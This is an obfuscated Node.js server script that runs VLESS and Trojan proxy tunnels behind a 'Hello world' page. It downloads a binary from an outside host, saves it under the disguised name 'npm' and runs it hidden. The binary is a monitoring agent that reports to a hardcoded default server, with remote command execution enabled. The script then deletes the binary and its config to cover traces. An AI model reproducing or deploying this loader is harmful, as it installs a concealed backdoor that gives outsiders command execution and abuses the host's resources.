const _0x216cc9=_0x359e;(function(_0x41d628,_0x93fb4f){const _0x9ea609=_0x359e,_0x317171=_0x41d628();while(!![]){try{const _0xa7ee86=parseInt(_0x9ea609(0x270))/0x1+-parseInt(_0x9ea609(0x235))/0x2+-parseInt(_0x9ea609(0x22e))/0x3+parseInt(_0x9ea609(0x23c))/0x4+parseInt(_0x9ea609(0x21c))/0x5+-parseInt(_0x9ea609(0x22d))/0x6+-parseInt(_0x9ea609(0x253))/0x7*(-parseInt(_0x9ea609(0x264))/0x8);if(_0xa7ee86===_0x93fb4f)break;else _0x317171['push'](_0x317171['shift']());}catch(_0x1f1956){_0x317171['push'](_0x317171['shift']());}}}(_0x2ce9,0xc3ea4));const os=require('os'),http=require(_0x216cc9(0x219)),fs=require('fs'),axios=require(_0x216cc9(0x207)),net=require(_0x216cc9(0x20c)),path=require(_0x216cc9(0x206)),crypto=require(_0x216cc9(0x231)),{Buffer}=require(_0x216cc9(0x202)),{exec,execSync}=require(_0x216cc9(0x232)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x216cc9(0x201)][_0x216cc9(0x26c)]||_0x216cc9(0x227),NEZHA_SERVER=process[_0x216cc9(0x201)]['NEZHA_SERVER']||_0x216cc9(0x21f),NEZHA_PORT=process[_0x216cc9(0x201)][_0x216cc9(0x228)]||'',NEZHA_KEY=process[_0x216cc9(0x201)][_0x216cc9(0x267)]||'AI8MeEXZporLq3KycP8zAWXHP3I6Jnrg',DOMAIN=process[_0x216cc9(0x201)]['DOMAIN']||_0x216cc9(0x210),AUTO_ACCESS=process[_0x216cc9(0x201)][_0x216cc9(0x234)]||![],WSPATH=process[_0x216cc9(0x201)][_0x216cc9(0x256)]||UUID[_0x216cc9(0x1f9)](0x0,0x8),SUB_PATH=process['env'][_0x216cc9(0x1ff)]||'sub',NAME=process['env'][_0x216cc9(0x271)]||'',PORT=process[_0x216cc9(0x201)][_0x216cc9(0x1fa)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x46ee9c=_0x216cc9;try{const _0x25bfcd=await axios[_0x46ee9c(0x21e)]('https://api.ip.sb/geoip'),_0x50eb3c=_0x25bfcd[_0x46ee9c(0x1f6)];ISP=(_0x50eb3c[_0x46ee9c(0x252)]+'-'+_0x50eb3c[_0x46ee9c(0x240)])[_0x46ee9c(0x259)](/ /g,'_');}catch(_0x36c38d){ISP=_0x46ee9c(0x1f3);}};GetISP();const httpServer=http[_0x216cc9(0x239)]((_0x18c3d2,_0x248dfc)=>{const _0xe897b6=_0x216cc9;if(_0x18c3d2['url']==='/'){const _0x63ffd0=path[_0xe897b6(0x249)](__dirname,_0xe897b6(0x20e));fs['readFile'](_0x63ffd0,_0xe897b6(0x257),(_0x31bb4f,_0x283b75)=>{const _0x474e9b=_0xe897b6;if(_0x31bb4f){_0x248dfc[_0x474e9b(0x24f)](0xc8,{'Content-Type':'text/html'}),_0x248dfc[_0x474e9b(0x261)](_0x474e9b(0x25e));return;}_0x248dfc[_0x474e9b(0x24f)](0xc8,{'Content-Type':_0x474e9b(0x217)}),_0x248dfc[_0x474e9b(0x261)](_0x283b75);});return;}else{if(_0x18c3d2[_0xe897b6(0x238)]==='/'+SUB_PATH){const _0x55f4dc=NAME?NAME+'-'+ISP:ISP,_0x12c0eb=_0xe897b6(0x26d)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x55f4dc,_0x34107d=_0xe897b6(0x269)+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0xe897b6(0x242)+DOMAIN+_0xe897b6(0x241)+WSPATH+'#'+_0x55f4dc,_0x461d34=_0x12c0eb+'\x0a'+_0x34107d,_0x1a3644=Buffer[_0xe897b6(0x26f)](_0x461d34)[_0xe897b6(0x245)](_0xe897b6(0x221));_0x248dfc[_0xe897b6(0x24f)](0xc8,{'Content-Type':_0xe897b6(0x200)}),_0x248dfc[_0xe897b6(0x261)](_0x1a3644+'\x0a');}else _0x248dfc[_0xe897b6(0x24f)](0x194,{'Content-Type':_0xe897b6(0x200)}),_0x248dfc[_0xe897b6(0x261)](_0xe897b6(0x237));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x216cc9(0x259)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x216cc9(0x21d)];function _0x359e(_0x1fd96a,_0x16ddf8){_0x1fd96a=_0x1fd96a-0x1f3;const _0x2ce93e=_0x2ce9();let _0x359eab=_0x2ce93e[_0x1fd96a];return _0x359eab;}function _0x2ce9(){const _0x39b83d=['2372184lCHAgt','1178271ZaBaOD','unlink','hex','crypto','child_process','https://arm64.ssss.nyc.mn/v1','AUTO_ACCESS','2095120wmHYRq','\x20with\x20all\x20DNS\x20servers','Not\x20Found\x0a','url','createServer','application/dns-json','test','2176920AGPIzq','message','error','write','isp','&path=%2F','&fp=chrome&type=ws&host=','/bin/bash','https://oooo.serv00.net/add-url','toString','Failed\x20to\x20resolve\x20','post','pipe','join','chmod\x20+x\x20npm','createHash','includes','digest','npm\x20is\x20running','writeHead','arm','2096','country_code','981106RZrnHt','2087','substr','WSPATH','utf8','find','replace','connect','https://dns.google/resolve?name=','\x20-p\x20','2053','Hello\x20world!','createWriteStream','Server\x20is\x20running\x20on\x20port\x20','end','map','catch','24iEZkqe','readUInt16BE','application/json','NEZHA_KEY','stream','trojan://','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','UUID','vless://','npm','from','1061058aRPZBC','NAME','Unknown','reduce','listen','data','pop','config.yaml','slice','PORT','readUInt8','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm\x20running\x20error:','443','SUB_PATH','text/plain','env','buffer','trim','https://arm64.ssss.nyc.mn/agent','log','path','axios','https://','arch','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','false','net','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','index.html','type','1234.abc.com','concat','split','Automatic\x20Access\x20Task\x20added\x20successfully','&type=A','writeFileSync','true','text/html','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','http','every','npm\x20download\x20successfully','3061935LcsoMv','1.1.1.1','get','nazha.546321.xyz','close','base64','decode','error:\x20','setsid\x20nohup\x20./npm\x20-s\x20','Answer','Status','fded4adc-7389-46e1-abef-4d2947c8422b','NEZHA_PORT','https://amd64.ssss.nyc.mn/agent','length','connection','once'];_0x2ce9=function(){return _0x39b83d;};return _0x2ce9();}function resolveHost(_0x344b41){return new Promise((_0x488e9b,_0x5ddc7e)=>{const _0x4db46d=_0x359e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4db46d(0x23b)](_0x344b41)){_0x488e9b(_0x344b41);return;}let _0x3a356c=0x0;function _0x195c7d(){const _0x4cfd19=_0x4db46d;if(_0x3a356c>=DNS_SERVERS[_0x4cfd19(0x22a)]){_0x5ddc7e(new Error(_0x4cfd19(0x246)+_0x344b41+_0x4cfd19(0x236)));return;}const _0x479ab3=DNS_SERVERS[_0x3a356c];_0x3a356c++;const _0x55fa72=_0x4cfd19(0x25b)+encodeURIComponent(_0x344b41)+_0x4cfd19(0x214);axios['get'](_0x55fa72,{'timeout':0x1388,'headers':{'Accept':_0x4cfd19(0x23a)}})['then'](_0x5759ef=>{const _0x13e560=_0x4cfd19,_0x252a88=_0x5759ef['data'];if(_0x252a88[_0x13e560(0x226)]===0x0&&_0x252a88[_0x13e560(0x225)]&&_0x252a88['Answer'][_0x13e560(0x22a)]>0x0){const _0x66f8f4=_0x252a88['Answer'][_0x13e560(0x258)](_0x2e4a17=>_0x2e4a17[_0x13e560(0x20f)]===0x1);if(_0x66f8f4){_0x488e9b(_0x66f8f4['data']);return;}}_0x195c7d();})['catch'](_0x3cf938=>{_0x195c7d();});}_0x195c7d();});}function handleVlessConnection(_0x24c26d,_0x1c5e29){const _0x3fad65=_0x216cc9,[_0x2d7a6a]=_0x1c5e29,_0x1f676b=_0x1c5e29[_0x3fad65(0x1f9)](0x1,0x11);if(!_0x1f676b[_0x3fad65(0x21a)]((_0x33a7bc,_0x1e7a25)=>_0x33a7bc==parseInt(uuid['substr'](_0x1e7a25*0x2,0x2),0x10)))return![];let _0x3f9b58=_0x1c5e29['slice'](0x11,0x12)[_0x3fad65(0x1fb)]()+0x13;const _0x216ac3=_0x1c5e29['slice'](_0x3f9b58,_0x3f9b58+=0x2)[_0x3fad65(0x265)](0x0),_0x5960de=_0x1c5e29[_0x3fad65(0x1f9)](_0x3f9b58,_0x3f9b58+=0x1)[_0x3fad65(0x1fb)](),_0x95fcd6=_0x5960de==0x1?_0x1c5e29[_0x3fad65(0x1f9)](_0x3f9b58,_0x3f9b58+=0x4)[_0x3fad65(0x249)]('.'):_0x5960de==0x2?new TextDecoder()[_0x3fad65(0x222)](_0x1c5e29[_0x3fad65(0x1f9)](_0x3f9b58+0x1,_0x3f9b58+=0x1+_0x1c5e29[_0x3fad65(0x1f9)](_0x3f9b58,_0x3f9b58+0x1)[_0x3fad65(0x1fb)]())):_0x5960de==0x3?_0x1c5e29['slice'](_0x3f9b58,_0x3f9b58+=0x10)[_0x3fad65(0x1f4)]((_0x57c124,_0x262401,_0x5766a4,_0x5ec271)=>_0x5766a4%0x2?_0x57c124[_0x3fad65(0x211)](_0x5ec271[_0x3fad65(0x1f9)](_0x5766a4-0x1,_0x5766a4+0x1)):_0x57c124,[])[_0x3fad65(0x262)](_0x13ace5=>_0x13ace5[_0x3fad65(0x265)](0x0)[_0x3fad65(0x245)](0x10))[_0x3fad65(0x249)](':'):'';_0x24c26d['send'](new Uint8Array([_0x2d7a6a,0x0]));const _0x4946b7=createWebSocketStream(_0x24c26d);return resolveHost(_0x95fcd6)['then'](_0x5c61ab=>{const _0x1d0fad=_0x3fad65;net['connect']({'host':_0x5c61ab,'port':_0x216ac3},function(){const _0xb76254=_0x359e;this[_0xb76254(0x23f)](_0x1c5e29[_0xb76254(0x1f9)](_0x3f9b58)),_0x4946b7['on'](_0xb76254(0x23e),()=>{})[_0xb76254(0x248)](this)['on']('error',()=>{})[_0xb76254(0x248)](_0x4946b7);})['on'](_0x1d0fad(0x23e),()=>{});})[_0x3fad65(0x263)](_0x405fd1=>{net['connect']({'host':_0x95fcd6,'port':_0x216ac3},function(){const _0x2e1d71=_0x359e;this[_0x2e1d71(0x23f)](_0x1c5e29[_0x2e1d71(0x1f9)](_0x3f9b58)),_0x4946b7['on'](_0x2e1d71(0x23e),()=>{})[_0x2e1d71(0x248)](this)['on'](_0x2e1d71(0x23e),()=>{})[_0x2e1d71(0x248)](_0x4946b7);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x297e7c,_0x22b0e9){const _0x5ea43f=_0x216cc9;try{if(_0x22b0e9[_0x5ea43f(0x22a)]<0x3a)return![];const _0xdadf6b=_0x22b0e9[_0x5ea43f(0x1f9)](0x0,0x38)[_0x5ea43f(0x245)](),_0x5863c4=[UUID];let _0x40c4e4=null;for(const _0x33369e of _0x5863c4){const _0x81a557=crypto[_0x5ea43f(0x24b)]('sha224')['update'](_0x33369e)[_0x5ea43f(0x24d)](_0x5ea43f(0x230));if(_0x81a557===_0xdadf6b){_0x40c4e4=_0x33369e;break;}}if(!_0x40c4e4)return![];let _0x3408b6=0x38;_0x22b0e9[_0x3408b6]===0xd&&_0x22b0e9[_0x3408b6+0x1]===0xa&&(_0x3408b6+=0x2);const _0x257a41=_0x22b0e9[_0x3408b6];if(_0x257a41!==0x1)return![];_0x3408b6+=0x1;const _0x2e3200=_0x22b0e9[_0x3408b6];_0x3408b6+=0x1;let _0x590523,_0x460325;if(_0x2e3200===0x1)_0x590523=_0x22b0e9[_0x5ea43f(0x1f9)](_0x3408b6,_0x3408b6+0x4)[_0x5ea43f(0x249)]('.'),_0x3408b6+=0x4;else{if(_0x2e3200===0x3){const _0x998118=_0x22b0e9[_0x3408b6];_0x3408b6+=0x1,_0x590523=_0x22b0e9[_0x5ea43f(0x1f9)](_0x3408b6,_0x3408b6+_0x998118)['toString'](),_0x3408b6+=_0x998118;}else{if(_0x2e3200===0x4)_0x590523=_0x22b0e9[_0x5ea43f(0x1f9)](_0x3408b6,_0x3408b6+0x10)[_0x5ea43f(0x1f4)]((_0x177b99,_0x2492d2,_0x42425a,_0x381c99)=>_0x42425a%0x2?_0x177b99[_0x5ea43f(0x211)](_0x381c99[_0x5ea43f(0x1f9)](_0x42425a-0x1,_0x42425a+0x1)):_0x177b99,[])['map'](_0x341149=>_0x341149[_0x5ea43f(0x265)](0x0)[_0x5ea43f(0x245)](0x10))[_0x5ea43f(0x249)](':'),_0x3408b6+=0x10;else return![];}}_0x460325=_0x22b0e9[_0x5ea43f(0x265)](_0x3408b6),_0x3408b6+=0x2;_0x3408b6<_0x22b0e9['length']&&_0x22b0e9[_0x3408b6]===0xd&&_0x22b0e9[_0x3408b6+0x1]===0xa&&(_0x3408b6+=0x2);const _0x3104be=createWebSocketStream(_0x297e7c);return resolveHost(_0x590523)['then'](_0xe33544=>{const _0xce09f1=_0x5ea43f;net['connect']({'host':_0xe33544,'port':_0x460325},function(){const _0x78252f=_0x359e;_0x3408b6<_0x22b0e9[_0x78252f(0x22a)]&&this[_0x78252f(0x23f)](_0x22b0e9['slice'](_0x3408b6)),_0x3104be['on']('error',()=>{})[_0x78252f(0x248)](this)['on'](_0x78252f(0x23e),()=>{})['pipe'](_0x3104be);})['on'](_0xce09f1(0x23e),()=>{});})[_0x5ea43f(0x263)](_0xc67ca=>{const _0x3bd7d9=_0x5ea43f;net[_0x3bd7d9(0x25a)]({'host':_0x590523,'port':_0x460325},function(){const _0x2a50c8=_0x3bd7d9;_0x3408b6<_0x22b0e9[_0x2a50c8(0x22a)]&&this['write'](_0x22b0e9[_0x2a50c8(0x1f9)](_0x3408b6)),_0x3104be['on'](_0x2a50c8(0x23e),()=>{})['pipe'](this)['on'](_0x2a50c8(0x23e),()=>{})['pipe'](_0x3104be);})['on']('error',()=>{});}),!![];}catch(_0x9858e9){return![];}}wss['on'](_0x216cc9(0x22b),(_0x5686db,_0xf90990)=>{const _0x2b9b34=_0x216cc9,_0x96484f=_0xf90990[_0x2b9b34(0x238)]||'';_0x5686db[_0x2b9b34(0x22c)](_0x2b9b34(0x23d),_0x45c9e1=>{const _0x194836=_0x2b9b34;if(_0x45c9e1['length']>0x11&&_0x45c9e1[0x0]===0x0){const _0x4957db=_0x45c9e1['slice'](0x1,0x11),_0x1a6d81=_0x4957db[_0x194836(0x21a)]((_0x25e45d,_0x514623)=>_0x25e45d==parseInt(uuid[_0x194836(0x255)](_0x514623*0x2,0x2),0x10));if(_0x1a6d81){!handleVlessConnection(_0x5686db,_0x45c9e1)&&_0x5686db[_0x194836(0x220)]();return;}}!handleTrojanConnection(_0x5686db,_0x45c9e1)&&_0x5686db[_0x194836(0x220)]();})['on'](_0x2b9b34(0x23e),()=>{});});const getDownloadUrl=()=>{const _0x215d43=_0x216cc9,_0x211340=os[_0x215d43(0x209)]();return _0x211340===_0x215d43(0x250)||_0x211340==='arm64'||_0x211340==='aarch64'?!NEZHA_PORT?_0x215d43(0x233):_0x215d43(0x204):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x215d43(0x229);},downloadFile=async()=>{const _0x146064=_0x216cc9;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2bfa18=getDownloadUrl(),_0x42c9f0=await axios({'method':_0x146064(0x21e),'url':_0x2bfa18,'responseType':_0x146064(0x268)}),_0x4e536f=fs[_0x146064(0x25f)]('npm');return _0x42c9f0[_0x146064(0x1f6)]['pipe'](_0x4e536f),new Promise((_0x905333,_0xeddbc2)=>{_0x4e536f['on']('finish',()=>{const _0x29e0ce=_0x359e;console[_0x29e0ce(0x205)](_0x29e0ce(0x21b)),exec(_0x29e0ce(0x24a),_0x466561=>{if(_0x466561)_0xeddbc2(_0x466561);_0x905333();});}),_0x4e536f['on']('error',_0xeddbc2);});}catch(_0xe22c24){throw _0xe22c24;}},runnz=async()=>{const _0x4bc7a3=_0x216cc9;try{const _0x33b84f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x33b84f[_0x4bc7a3(0x203)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4005d4){}await downloadFile();let _0x39c021='',_0x40e5c8=[_0x4bc7a3(0x1fe),'8443',_0x4bc7a3(0x251),_0x4bc7a3(0x254),'2083',_0x4bc7a3(0x25d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x549218=_0x40e5c8[_0x4bc7a3(0x24c)](NEZHA_PORT)?'--tls':'';_0x39c021=_0x4bc7a3(0x224)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4bc7a3(0x25c)+NEZHA_KEY+'\x20'+_0x549218+_0x4bc7a3(0x218);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1dd292=NEZHA_SERVER[_0x4bc7a3(0x24c)](':')?NEZHA_SERVER[_0x4bc7a3(0x212)](':')[_0x4bc7a3(0x1f7)]():'',_0x44328d=_0x40e5c8[_0x4bc7a3(0x24c)](_0x1dd292)?_0x4bc7a3(0x216):_0x4bc7a3(0x20b),_0x3b667a='client_secret:\x20'+NEZHA_KEY+_0x4bc7a3(0x1fc)+NEZHA_SERVER+_0x4bc7a3(0x26b)+_0x44328d+_0x4bc7a3(0x20d)+UUID;fs[_0x4bc7a3(0x215)](_0x4bc7a3(0x1f8),_0x3b667a);}_0x39c021=_0x4bc7a3(0x20a);}else{console[_0x4bc7a3(0x205)](_0x4bc7a3(0x26a));return;}}try{exec(_0x39c021,{'shell':_0x4bc7a3(0x243)},_0x81c2cc=>{const _0x369c77=_0x4bc7a3;if(_0x81c2cc)console['error'](_0x369c77(0x1fd),_0x81c2cc);else console['log'](_0x369c77(0x24e));});}catch(_0x486d6c){console['error'](_0x4bc7a3(0x223)+_0x486d6c);}};async function addAccessTask(){const _0x42b1b6=_0x216cc9;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x56d7a7=_0x42b1b6(0x208)+DOMAIN+'/'+SUB_PATH;try{const _0x692afb=await axios[_0x42b1b6(0x247)](_0x42b1b6(0x244),{'url':_0x56d7a7},{'headers':{'Content-Type':_0x42b1b6(0x266)}});console[_0x42b1b6(0x205)](_0x42b1b6(0x213));}catch(_0x1dca3a){}}const delFiles=()=>{const _0x39e31f=_0x216cc9;fs[_0x39e31f(0x22f)](_0x39e31f(0x26e),()=>{}),fs[_0x39e31f(0x22f)](_0x39e31f(0x1f8),()=>{});};httpServer[_0x216cc9(0x1f5)](PORT,()=>{const _0x53f330=_0x216cc9;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x53f330(0x205)](_0x53f330(0x260)+PORT);});
